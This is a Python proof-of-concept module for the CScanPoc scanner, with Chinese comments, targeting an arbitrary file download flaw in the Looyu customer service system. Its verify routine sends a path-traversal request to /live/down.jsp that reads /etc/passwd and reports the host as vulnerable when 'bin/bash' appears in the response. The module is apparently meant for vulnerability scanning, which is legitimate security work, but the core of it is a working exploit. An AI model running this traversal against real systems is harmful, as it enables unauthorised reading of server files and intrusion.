# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Looyu_0012'  # 平台漏洞编号，留空
    name = '乐语客服系统任意文件下载漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-12-17'  # 漏洞公布时间
    desc = '''
        乐语OMS是一款整合多终端的即时在线客服系统，支持千万级并发，让企业迅速捕获有效客户信息。同时整合CRM客户管理、数据分析、手机站群营销等功能，实现从流量到客户到成单再到数据分析的全流程管理，是企业构建网络营销运营系统必备的软件。
        乐语客服系统任意文件下载漏洞
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0150444'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '乐语客服系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0f9301ec-8853-440d-993c-8d077fd3e695'  # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + "/live/down.jsp?file=../../../../../../../../../../../../../../../../etc/passwd"
            code, head, res, errcode, _ = hh.http(url)
            if code == 200 and 'bin/bash' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
